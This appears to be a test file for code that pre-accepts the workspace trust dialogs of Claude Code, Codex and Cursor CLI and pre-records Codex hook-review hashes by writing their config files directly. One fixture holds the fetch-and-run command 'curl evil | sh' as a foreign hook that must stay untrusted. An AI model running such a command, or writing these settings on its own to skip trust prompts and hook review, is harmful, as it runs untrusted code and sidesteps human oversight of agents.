// The pre-trust writers (#685): a fresh file, an existing file with other keys, and
// an already-trusted directory, for each Harness that has a writer.

import { spawnSync } from "node:child_process";
import * as fs from "node:fs";
import * as os from "node:os";
import * as path from "node:path";
import { afterEach, beforeEach, describe, expect, it } from "vitest";
import {
  CODEX_HOOK_HASH_VERIFIED,
  codexHookHash,
  codexHookKey,
  hookStateConflict,
  tomlContinuationLines,
  cursorMarkerPath,
  cursorProjectSlug,
  ownedCodexHookTrust,
  pretrustWorkspaces,
  trustClaudeCode,
  trustCodex,
  trustCodexHooks,
  trustCursor,
} from "../harness-pretrust";
import { hookCommand, installHarnessHooks } from "../harness-hooks";

let dir: string;
beforeEach(() => {
  dir = fs.mkdtempSync(path.join(os.tmpdir(), "pretrust-"));
});
afterEach(() => fs.rmSync(dir, { recursive: true, force: true }));

/** The config as Python's tomllib reads it (a strict TOML 1.0 parser), or null where there is none to ask. */
function parseToml(text: string): any {
  const run = spawnSync("python3", ["-c", "import sys, json, tomllib; print(json.dumps(tomllib.loads(sys.stdin.read())))"], { input: text, encoding: "utf8" });
  if (run.error || (run.status !== 0 && /No module named 'tomllib'|No such file/.test(run.stderr ?? ""))) return null;
  if (run.status !== 0) throw new Error(`not valid TOML: ${run.stderr}`);
  return JSON.parse(run.stdout);
}

const read = (file: string) => fs.readFileSync(file, "utf8");
const leftovers = () => fs.readdirSync(dir).filter((name) => name.endsWith(".tmp"));

describe("claude-code: ~/.claude.json projects[dir].hasTrustDialogAccepted", () => {
  it("creates the file, owner-only, when there is none", () => {
    const file = path.join(dir, ".claude.json");
    expect(trustClaudeCode(file, ["/home/core"])).toBe("written");
    expect(JSON.parse(read(file))).toEqual({ projects: { "/home/core": { hasTrustDialogAccepted: true } } });
    expect(fs.statSync(file).mode & 0o777).toBe(0o600);
    expect(leftovers()).toEqual([]);
  });

  it("keeps every other key, at the top and inside the project entry", () => {
    const file = path.join(dir, ".claude.json");
    fs.writeFileSync(
      file,
      JSON.stringify({
        numStartups: 3,
        projects: {
          "/home/core": { allowedTools: ["Bash"], hasTrustDialogAccepted: false, lastCost: 1 },
          "/other": { hasTrustDialogAccepted: true },
        },
      }),
      { mode: 0o640 },
    );
    expect(trustClaudeCode(file, ["/home/core", "/srv/work"])).toBe("written");
    expect(JSON.parse(read(file))).toEqual({
      numStartups: 3,
      projects: {
        "/home/core": { allowedTools: ["Bash"], hasTrustDialogAccepted: true, lastCost: 1 },
        "/other": { hasTrustDialogAccepted: true },
        "/srv/work": { hasTrustDialogAccepted: true },
      },
    });
    expect(fs.statSync(file).mode & 0o777).toBe(0o640);
  });

  it("writes nothing when every directory is already trusted", () => {
    const file = path.join(dir, ".claude.json");
    const text = '{"projects":{"/home/core":{"hasTrustDialogAccepted":true}}}';
    fs.writeFileSync(file, text);
    const before = fs.statSync(file).mtimeMs;
    expect(trustClaudeCode(file, ["/home/core"])).toBe("unchanged");
    expect(read(file)).toBe(text);
    expect(fs.statSync(file).mtimeMs).toBe(before);
  });

  it("leaves a file it cannot parse exactly as it was", () => {
    const file = path.join(dir, ".claude.json");
    fs.writeFileSync(file, "{ not json");
    expect(() => trustClaudeCode(file, ["/home/core"])).toThrow();
    expect(read(file)).toBe("{ not json");
  });
});

describe("codex: ~/.codex/config.toml [projects.\"dir\"] trust_level", () => {
  it("creates the file and its directory when there is none", () => {
    const file = path.join(dir, ".codex", "config.toml");
    expect(trustCodex(file, ["/home/core"])).toBe("written");
    expect(read(file)).toBe('[projects."/home/core"]\ntrust_level = "trusted"\n');
  });

  it("writes the table codex 0.160.0 itself writes, beside one it wrote by hand (#702)", () => {
    // `~/.codex/config.toml` of a throwaway home after codex-cli 0.160.0's "Trust this folder?" dialog was
    // answered with "Trust and continue" for `/home/core/.cache/codex-702-capture/repo2`, verbatim.
    const codexWrote =
      '[tui]\nscreen_reader_detection_done = true\n\n[tui.model_availability_nux]\n"gpt-6.1-sol" = 1\n\n' +
      '[projects."/home/core/.cache/codex-702-capture/repo2"]\ntrust_level = "trusted"\n';
    const file = path.join(dir, "config.toml");
    fs.writeFileSync(file, codexWrote);
    expect(trustCodex(file, ["/home/core/.cache/codex-702-capture/repo2"])).toBe("unchanged");
    expect(trustCodex(file, ["/home/core/.cache/codex-702-capture/repo"])).toBe("written");
    // What the file held when codex 0.160.0, started again in `repo`, opened on its composer with no dialog
    // (`fixtures/codex-0.160.0-trusted-boot.txt`).
    expect(read(file)).toBe(codexWrote + '\n[projects."/home/core/.cache/codex-702-capture/repo"]\ntrust_level = "trusted"\n');
    const parsed = parseToml(read(file));
    if (parsed) {
      expect(parsed.projects["/home/core/.cache/codex-702-capture/repo"]).toEqual({ trust_level: "trusted" });
      expect(parsed.projects["/home/core/.cache/codex-702-capture/repo2"]).toEqual({ trust_level: "trusted" });
    }
  });

  it("appends to a file with other keys and tables, keeping them", () => {
    const file = path.join(dir, "config.toml");
    const before = 'model = "gpt-5"\n\n[projects."/other"]\ntrust_level = "untrusted"\n\n[tui]\ntheme = "dark"\n';
    fs.writeFileSync(file, before);
    expect(trustCodex(file, ["/home/core"])).toBe("written");
    const after = read(file);
    expect(after.startsWith(before)).toBe(true);
    expect(after).toContain('[projects."/home/core"]\ntrust_level = "trusted"\n');
    expect(after).toContain('[projects."/other"]\ntrust_level = "untrusted"');
  });

  it("upgrades an untrusted entry in place and adds a missing key to an existing table", () => {
    const file = path.join(dir, "config.toml");
    fs.writeFileSync(
      file,
      '[projects."/a"]\ntrust_level = "untrusted"  \nnote = 1\n\n[projects."/b"]\nnote = 2\n\n[tui]\ntheme = "dark"\n',
    );
    expect(trustCodex(file, ["/a", "/b"])).toBe("written");
    expect(read(file)).toBe(
      '[projects."/a"]\ntrust_level = "trusted"\nnote = 1\n\n[projects."/b"]\ntrust_level = "trusted"\nnote = 2\n\n[tui]\ntheme = "dark"\n',
    );
  });

  it("writes nothing when already trusted, and matches single-quoted and escaped keys", () => {
    const file = path.join(dir, "config.toml");
    const text = "[projects.'/home/core']\ntrust_level = \"trusted\" # mine\n";
    fs.writeFileSync(file, text);
    expect(trustCodex(file, ["/home/core"])).toBe("unchanged");
    expect(read(file)).toBe(text);
    expect(trustCodex(file, ['/we"ird\\dir'])).toBe("written");
    expect(read(file)).toContain('[projects."/we\\"ird\\\\dir"]');
    expect(trustCodex(file, ['/we"ird\\dir'])).toBe("unchanged");
  });

  it("keeps CRLF line endings", () => {
    const file = path.join(dir, "config.toml");
    fs.writeFileSync(file, 'model = "x"\r\n');
    trustCodex(file, ["/a"]);
    expect(read(file)).toBe('model = "x"\r\n\r\n[projects."/a"]\r\ntrust_level = "trusted"\r\n');
  });

  it("refuses to edit a file that defines projects as an inline table", () => {
    const file = path.join(dir, "config.toml");
    fs.writeFileSync(file, 'projects = { "/a" = { trust_level = "trusted" } }\n');
    expect(() => trustCodex(file, ["/b"])).toThrow(/does not edit/);
    expect(read(file)).toBe('projects = { "/a" = { trust_level = "trusted" } }\n');
  });
});

describe("pretrustWorkspaces", () => {
  it("writes only the Harnesses named, and reports a failure without throwing", () => {
    fs.writeFileSync(path.join(dir, ".claude.json"), "{ broken");
    const results = pretrustWorkspaces(dir, ["claude-code", "codex", "cursor-cli", "pi"], ["/home/core"]);
    expect(results.map((r) => [r.harness, r.outcome])).toEqual([
      ["claude-code", "failed"],
      ["codex", "written"],
      ["cursor-cli", "written"],
    ]);
    expect(fs.existsSync(path.join(dir, ".codex", "config.toml"))).toBe(true);
    expect(pretrustWorkspaces(dir, ["pi"], ["/home/core"])).toEqual([]);
    expect(pretrustWorkspaces(dir, ["cursor-cli"], ["/home/core"]).map((r) => [r.harness, r.outcome])).toEqual([["cursor-cli", "unchanged"]]);
  });
});

describe("cursor-cli: ~/.cursor/projects/<slug>/.workspace-trusted", () => {
  const at = () => new Date("2026-10-04T09:21:07.646Z");
  const marker = (slug: string) => path.join(dir, ".cursor", "projects", slug, ".workspace-trusted");

  it("maps a path to its slug: leading slash dropped, other slashes become dashes", () => {
    expect(cursorProjectSlug("/home/core")).toBe("home-core");
    expect(cursorProjectSlug("/home/core/repos/x")).toBe("home-core-repos-x");
    expect(cursorMarkerPath("/h", "/home/core")).toBe("/h/.cursor/projects/home-core/.workspace-trusted");
  });

  it("creates the marker exactly as Cursor does: two keys, two-space indent, mode 644", () => {
    expect(trustCursor(dir, ["/home/core"], at)).toBe("written");
    expect(read(marker("home-core"))).toBe(
      '{\n  "trustedAt": "2026-10-04T09:21:07.646Z",\n  "workspacePath": "/home/core"\n}',
    );
    expect(fs.statSync(marker("home-core")).mode & 0o777).toBe(0o644);
    expect(fs.readdirSync(path.dirname(marker("home-core")))).toEqual([".workspace-trusted"]);
  });

  it("never overwrites an existing marker, and reports it unchanged", () => {
    fs.mkdirSync(path.dirname(marker("home-core")), { recursive: true });
    fs.writeFileSync(marker("home-core"), '{"trustedAt":"2020-01-01T00:00:00.000Z","workspacePath":"/home/core"}');
    expect(trustCursor(dir, ["/home/core"], at)).toBe("unchanged");
    expect(read(marker("home-core"))).toContain("2020-01-01");
  });

  it("writes nested paths into their own directories, only the missing ones", () => {
    trustCursor(dir, ["/home/core"], at);
    expect(trustCursor(dir, ["/home/core", "/home/core/repos/app"], at)).toBe("written");
    expect(JSON.parse(read(marker("home-core-repos-app"))).workspacePath).toBe("/home/core/repos/app");
    expect(trustCursor(dir, ["/home/core", "/home/core/repos/app"], at)).toBe("unchanged");
  });

  it("is ambiguous for a dash in the path: the second colliding path is left to the existing marker", () => {
    expect(cursorProjectSlug("/home/a-b")).toBe(cursorProjectSlug("/home/a/b"));
    expect(trustCursor(dir, ["/home/a-b"], at)).toBe("written");
    expect(trustCursor(dir, ["/home/a/b"], at)).toBe("unchanged");
    expect(JSON.parse(read(marker("home-a-b"))).workspacePath).toBe("/home/a-b");
  });

  it("ignores a relative path and the root", () => {
    expect(trustCursor(dir, ["relative/dir", "/"], at)).toBe("unchanged");
    expect(fs.existsSync(path.join(dir, ".cursor"))).toBe(false);
  });
});

// What codex 0.160.0 itself wrote to ~/.codex/config.toml after its hook review was answered by hand on a Core,
// for the hooks `installHarnessHooks("codex")` writes (the first eight hex digits were read off that file; the rest
// is this function's output, and the prefixes are what pin it to codex). codex 0.162.0 listed the same three
// through `hooks/list` (#703, `codex-hook-trust-check.test.ts` runs that against a real codex when there is one).
const REAL_HASHES: Record<string, string> = {
  PermissionRequest: "sha256:777d6667e97d3543f8f43d42796281cd863fb133097563631d65ea5b657094f3",
  UserPromptSubmit: "sha256:f23db2db11919289814ac6c32a2b10ca0c24a4d8c4a7fbbf401520266e115a27",
  Stop: "sha256:0fc320513044eada106bd90279e5937b1283a78fd42f81efbf486a8e700e5cfd",
};

describe("codex hook trust: [hooks.state.\"<hooks.json>:<event>:<group>:<handler>\"] trusted_hash", () => {
  it("reproduces the hashes codex 0.160.0 wrote for the hooks this Core installs, and 0.162.0 still reports", () => {
    expect(CODEX_HOOK_HASH_VERIFIED).toBe("0.162.0");
    for (const [event, hash] of Object.entries(REAL_HASHES)) {
      expect(codexHookHash(event, { command: hookCommand("codex", event) })).toBe(hash);
    }
  });

  it("hashes the normalised hook: a changed command, timeout, matcher or event gives another hash", () => {
    const base = codexHookHash("Stop", { command: "echo hi" });
    expect(base).toMatch(/^sha256:[0-9a-f]{64}$/);
    expect(codexHookHash("Stop", { command: "echo hi", timeout: 600 })).toBe(base); // 600 is the default
    expect(codexHookHash("Stop", { command: "echo hi", timeout: 5 })).not.toBe(base);
    expect(codexHookHash("Stop", { command: "echo ho" })).not.toBe(base);
    expect(codexHookHash("Stop", { command: "echo hi" }, "Bash")).not.toBe(base);
    expect(codexHookHash("UserPromptSubmit", { command: "echo hi" })).not.toBe(base);
    expect(codexHookHash("Stop", { command: "echo hi", async: true })).not.toBe(base);
    expect(codexHookHash("NotAnEvent", { command: "echo hi" })).toBeNull();
  });

  it("names a hook by its file, the event as codex spells it, and its group and handler index", () => {
    expect(codexHookKey("/home/core/.codex/hooks.json", "PermissionRequest", 0, 0)).toBe("/home/core/.codex/hooks.json:permission_request:0:0");
    expect(codexHookKey("/h/.codex/hooks.json", "Stop", 2, 1)).toBe("/h/.codex/hooks.json:stop:2:1");
  });

  it("reads the hooks this Core installed off the file, by their index, and leaves a foreign hook untrusted", () => {
    const cwd = path.join(dir, "work");
    fs.mkdirSync(path.join(cwd, ".codex"), { recursive: true });
    const file = path.join(cwd, ".codex", "hooks.json");
    fs.writeFileSync(file, JSON.stringify({ hooks: { Stop: [{ hooks: [{ type: "command", command: "theirs" }] }] } }));
    expect(installHarnessHooks("codex", cwd, {}).installed).toBe(true);
    const owned = ownedCodexHookTrust(file);
    expect(owned.map(([key]) => key).sort()).toEqual(
      [`${file}:permission_request:0:0`, `${file}:stop:1:0`, `${file}:user_prompt_submit:0:0`].sort(),
    );
    expect(new Map(owned).get(`${file}:stop:1:0`)).toBe(REAL_HASHES.Stop);
  });

  it("writes a table per hook into a fresh config.toml, owner-only", () => {
    const file = path.join(dir, "config.toml");
    const entries = [["/h/.codex/hooks.json:stop:0:0", REAL_HASHES.Stop!], ["/h/.codex/hooks.json:user_prompt_submit:0:0", REAL_HASHES.UserPromptSubmit!]] as const;
    expect(trustCodexHooks(file, entries)).toBe("written");
    expect(read(file)).toBe(
      `[hooks.state."/h/.codex/hooks.json:stop:0:0"]\ntrusted_hash = "${REAL_HASHES.Stop}"\n\n` +
        `[hooks.state."/h/.codex/hooks.json:user_prompt_submit:0:0"]\ntrusted_hash = "${REAL_HASHES.UserPromptSubmit}"\n`,
    );
    expect(fs.statSync(file).mode & 0o777).toBe(0o600);
    expect(leftovers()).toEqual([]);
  });

  it("is idempotent, and keeps other keys, projects, comments and a table's own settings", () => {
    const file = path.join(dir, "config.toml");
    const key = "/h/.codex/hooks.json:stop:0:0";
    fs.writeFileSync(
      file,
      `# mine\nmodel = "gpt-6"\n\n[projects."/h"]\ntrust_level = "trusted"\n\n[hooks.state."${key}"]\nenabled = true\n\n[tui]\ntheme = "dark"\n`,
    );
    expect(trustCodexHooks(file, [[key, REAL_HASHES.Stop!]])).toBe("written");
    const once = read(file);
    expect(once).toContain(`[hooks.state."${key}"]\ntrusted_hash = "${REAL_HASHES.Stop}"\nenabled = true`);
    expect(once).toContain('# mine\nmodel = "gpt-6"');
    expect(once).toContain('[projects."/h"]\ntrust_level = "trusted"');
    expect(once).toContain('[tui]\ntheme = "dark"');
    expect(trustCodexHooks(file, [[key, REAL_HASHES.Stop!]])).toBe("unchanged");
    expect(read(file)).toBe(once);
  });

  it("replaces a stale hash (the hook changed) and nothing else", () => {
    const file = path.join(dir, "config.toml");
    const key = "/h/.codex/hooks.json:stop:0:0";
    fs.writeFileSync(file, `[hooks.state."${key}"]\ntrusted_hash = "sha256:stale"\nenabled = false\n`);
    expect(trustCodexHooks(file, [[key, REAL_HASHES.Stop!]])).toBe("written");
    expect(read(file)).toBe(`[hooks.state."${key}"]\ntrusted_hash = "${REAL_HASHES.Stop}"\nenabled = false\n`);
  });

  it("still writes beside `[features] hooks = true`, codex's own switch for --enable hooks", () => {
    const file = path.join(dir, "config.toml");
    const key = "/h/.codex/hooks.json:stop:0:0";
    fs.writeFileSync(file, '[features]\nhooks = true\n\n[tui]\nhooks = "unrelated"\n');
    expect(hookStateConflict(read(file).split("\n"))).toBeNull();
    expect(trustCodexHooks(file, [[key, REAL_HASHES.Stop!]])).toBe("written");
    expect(read(file)).toContain('[features]\nhooks = true');
    expect(read(file)).toContain(`[hooks.state."${key}"]\ntrusted_hash = "${REAL_HASHES.Stop}"`);
    const parsed = parseToml(read(file));
    if (parsed) {
      expect(parsed.features).toEqual({ hooks: true });
      expect(parsed.hooks.state[key]).toEqual({ trusted_hash: REAL_HASHES.Stop });
    }
  });

  it.each([
    ["a top-level hooks key", 'hooks = { state = {} }\n'],
    ["a top-level dotted hooks key", 'hooks.state."/h/x:stop:0:0".trusted_hash = "sha256:old"\n'],
    ["a state key in [hooks]", '[hooks]\nstate = { "/h/x:stop:0:0" = { trusted_hash = "sha256:old" } }\n'],
    ["a dotted state key in [hooks]", '[hooks]\nstate."/h/x:stop:0:0".trusted_hash = "sha256:old"\n'],
    ["a quoted state key in [hooks]", '[hooks]\n"state" = {}\n'],
    ["a bare [hooks.state] table", '[hooks.state]\n"/h/x:stop:0:0".trusted_hash = "sha256:old"\n'],
    ["a spaced and quoted [hooks.state] table", '[ "hooks" . state ]\n'],
  ])("leaves a config with %s alone, writes no duplicate table, and says so", (_name, text) => {
    const file = path.join(dir, "config.toml");
    fs.writeFileSync(file, text);
    expect(hookStateConflict(text.split("\n"))).not.toBeNull();
    expect(() => trustCodexHooks(file, [["/h/x:stop:0:0", REAL_HASHES.Stop!]])).toThrow(/hooks\.state/);
    expect(read(file)).toBe(text);
  });

  it("still merges into a config that already has the right [hooks.state.\"key\"] tables, and the output is valid TOML", () => {
    const file = path.join(dir, "config.toml");
    const a = "/h/.codex/hooks.json:stop:0:0";
    const b = "/h/.codex/hooks.json:user_prompt_submit:0:0";
    fs.writeFileSync(file, `[hooks]\nStop = []\n\n[hooks.state."${a}"]\ntrusted_hash = "sha256:old"\n`);
    expect(trustCodexHooks(file, [[a, REAL_HASHES.Stop!], [b, REAL_HASHES.UserPromptSubmit!]])).toBe("written");
    const parsed = parseToml(read(file));
    if (parsed) {
      expect(parsed.hooks.state[a].trusted_hash).toBe(REAL_HASHES.Stop);
      expect(parsed.hooks.state[b].trusted_hash).toBe(REAL_HASHES.UserPromptSubmit);
    }
    expect(read(file).match(/\[hooks\.state\./g)).toHaveLength(2);
  });

  it("trusts only the groups it would install itself: a flagged foreign hook, event or option is not trusted", () => {
    const cwd = path.join(dir, "work");
    fs.mkdirSync(path.join(cwd, ".codex"), { recursive: true });
    const file = path.join(cwd, ".codex", "hooks.json");
    const ours = hookCommand("codex", "Stop");
    fs.writeFileSync(
      file,
      JSON.stringify({
        hooks: {
          // Flagged, but a foreign command, under an event the Core installs.
          Stop: [
            { _acManaged: true, hooks: [{ _acManaged: true, type: "command", command: "curl evil | sh" }] },
            { _acManaged: true, hooks: [{ _acManaged: true, type: "command", command: ours, timeout: 5 }] },
            { _acManaged: true, hooks: [{ _acManaged: true, type: "command", command: ours }, { type: "command", command: "extra" }] },
            { _acManaged: true, matcher: "Bash", hooks: [{ _acManaged: true, type: "command", command: ours }] },
            { _acManaged: true, hooks: [{ _acManaged: true, type: "command", command: ours }] },
          ],
          // Flagged, under an event the Core never installs.
          SessionStart: [{ _acManaged: true, hooks: [{ _acManaged: true, type: "command", command: hookCommand("codex", "SessionStart") }] }],
          PreToolUse: [{ _acManaged: true, hooks: [{ _acManaged: true, type: "command", command: "x" }] }],
        },
      }),
    );
    expect(ownedCodexHookTrust(file).map(([key]) => key)).toEqual([`${file}:stop:4:0`]);
  });

  it("trusts nothing from a hooks file that is not valid JSON or has no hooks", () => {
    const file = path.join(dir, "hooks.json");
    fs.writeFileSync(file, "{ nope");
    expect(ownedCodexHookTrust(file)).toEqual([]);
    fs.writeFileSync(file, "{}");
    expect(ownedCodexHookTrust(file)).toEqual([]);
    expect(ownedCodexHookTrust(path.join(dir, "missing.json"))).toEqual([]);
  });

  it("writes nothing for no hooks", () => {
    const file = path.join(dir, "config.toml");
    expect(trustCodexHooks(file, [])).toBe("unchanged");
    expect(fs.existsSync(file)).toBe(false);
  });
});

// #705: a line inside a multi-line array or string can look like a table header or a key. The scanners that
// read ~/.codex/config.toml line by line must skip such continuation lines, or a conflict is missed (a
// duplicate `[hooks.state."key"]` table would then be written) or invented (a config nothing is wrong with is
// refused).
describe("codex config.toml scanners skip continuation lines (#705)", () => {
  const STOP_KEY = "/h/.codex/hooks.json:stop:0:0";

  it("marks the lines that continue a multi-line array or string, and nothing else", () => {
    const text = [
      'a = "[x]" # [hooks]', // 0: single-line string and comment: brackets count for nothing
      "[tui]", // 1: a header opens and closes on its line
      "[[arr]]", // 2
      "m = [", // 3
      '  ["a", "b"]', // 4: continuation
      "]", // 5: continuation (closes the array)
      'b = """', // 6
      "[hooks]", // 7: continuation
      '\\""" still open', // 8: continuation: an escaped quote does not close the string
      '""""', // 9: continuation: content `"`, then the delimiter
      "c = '''", // 10
      "[hooks.state]", // 11: continuation
      "'''", // 12: continuation (closes the string)
      'd = ["""', // 13
      '""", "x",', // 14: continuation: the string closes, the array stays open
      "]", // 15: continuation
      "e = 1", // 16
      "f = { g = [1] }", // 17
      '"[k]" = 2', // 18: a quoted key with brackets
    ];
    expect(tomlContinuationLines(text).map((flag, i) => (flag ? i : -1)).filter((i) => i >= 0)).toEqual([4, 5, 7, 8, 9, 11, 12, 14, 15]);
    expect(tomlContinuationLines([])).toEqual([]);
    expect(tomlContinuationLines(["]", "x = 1"])).toEqual([false, false]);
  });

  it.each([
    ["a nested array whose last element sits on its own line", 'matrix = [\n  ["a", "b"]\n]\nhooks = { state = {} }\n', "a top-level `hooks` key"],
    ["a multi-line array with a bracket line before a top-level hooks key", 'm = [\n  [1],\n  [2]\n]\n\nhooks.state."k".trusted_hash = "x"\n', "a top-level `hooks` key"],
    ["a table header quoted in a multi-line basic string", 'note = """\n[tui]\n"""\nhooks = { state = {} }\n', "a top-level `hooks` key"],
    ["a table header quoted in a multi-line literal string", "note = '''\n[tui]\n'''\nhooks = { state = {} }\n", "a top-level `hooks` key"],
    ["a [hooks] header quoted in a string before a real [hooks] table", 'note = """\n[tui]\n"""\n[hooks]\nstate = {}\n', "a `state` key in [hooks]"],
  ])("still sees the conflict after %s", (_name, text, why) => {
    expect(hookStateConflict(text.split("\n"))).toBe(why);
  });

  it.each([
    ["a [hooks] header quoted in a multi-line basic string", 'note = """\n[hooks]\n"""\nstate = {}\n'],
    ["a [hooks] header quoted in a multi-line literal string", "note = '''\n[hooks]\n'''\nstate = {}\n"],
    ["a [hooks.state] header quoted in a string", 'doc = """\n[hooks.state]\n"""\n'],
    ["a hooks key quoted in a string", 'doc = """\nhooks = {}\nstate = {}\n"""\n'],
    ["a hooks key on an array continuation line", 'm = [\n  1,\n  2\n]\n[tui]\nhooks = "x"\n'],
    ["a hooks line after a string that closes with extra quotes", 'doc = """\n""""\n[tui]\nhooks = "x"\n'],
  ])("invents no conflict from %s", (_name, text) => {
    expect(hookStateConflict(text.split("\n"))).toBeNull();
  });

  it("edits the real [hooks.state.\"key\"] table, not a look-alike inside a string, and the output is valid TOML", () => {
    const file = path.join(dir, "config.toml");
    const before = `doc = """\n[hooks.state."${STOP_KEY}"]\ntrusted_hash = "sha256:quoted"\n"""\n`;
    fs.writeFileSync(file, before);
    expect(trustCodexHooks(file, [[STOP_KEY, REAL_HASHES.Stop!]])).toBe("written");
    expect(read(file)).toBe(`${before}\n[hooks.state."${STOP_KEY}"]\ntrusted_hash = "${REAL_HASHES.Stop}"\n`);
    const parsed = parseToml(read(file));
    if (parsed) {
      expect(parsed.doc).toBe(`[hooks.state."${STOP_KEY}"]\ntrusted_hash = "sha256:quoted"\n`);
      expect(parsed.hooks.state[STOP_KEY]).toEqual({ trusted_hash: REAL_HASHES.Stop });
    }
    expect(trustCodexHooks(file, [[STOP_KEY, REAL_HASHES.Stop!]])).toBe("unchanged");
  });

  it("does not end a [hooks.state.\"key\"] table at a bracket line of its own multi-line array, so the stale hash is replaced and not duplicated", () => {
    const file = path.join(dir, "config.toml");
    fs.writeFileSync(file, `[hooks.state."${STOP_KEY}"]\ntags = [\n  [1],\n  [2]\n]\ntrusted_hash = "sha256:stale"\n\n[tui]\ntheme = "dark"\n`);
    expect(trustCodexHooks(file, [[STOP_KEY, REAL_HASHES.Stop!]])).toBe("written");
    const after = read(file);
    expect(after).toBe(`[hooks.state."${STOP_KEY}"]\ntags = [\n  [1],\n  [2]\n]\ntrusted_hash = "${REAL_HASHES.Stop}"\n\n[tui]\ntheme = "dark"\n`);
    expect(after.match(/trusted_hash/g)).toHaveLength(1);
    const parsed = parseToml(after);
    if (parsed) expect(parsed.hooks.state[STOP_KEY]).toEqual({ tags: [[1], [2]], trusted_hash: REAL_HASHES.Stop });
  });

  it("does the same for [projects.\"dir\"]: a look-alike in a string is not edited and a bracket line does not end the table", () => {
    const file = path.join(dir, "config.toml");
    fs.writeFileSync(
      file,
      `doc = """\nprojects = {}\n[projects."/h/a"]\n"""\n\n[projects."/h/b"]\nextra = [\n  [1]\n]\ntrust_level = "untrusted"\n`,
    );
    expect(trustCodex(file, ["/h/a", "/h/b"])).toBe("written");
    const after = read(file);
    expect(after).toBe(
      `doc = """\nprojects = {}\n[projects."/h/a"]\n"""\n\n[projects."/h/b"]\nextra = [\n  [1]\n]\ntrust_level = "trusted"\n\n[projects."/h/a"]\ntrust_level = "trusted"\n`,
    );
    const parsed = parseToml(after);
    if (parsed) {
      expect(parsed.projects["/h/a"]).toEqual({ trust_level: "trusted" });
      expect(parsed.projects["/h/b"]).toEqual({ extra: [[1]], trust_level: "trusted" });
    }
    expect(trustCodex(file, ["/h/a", "/h/b"])).toBe("unchanged");
  });
});
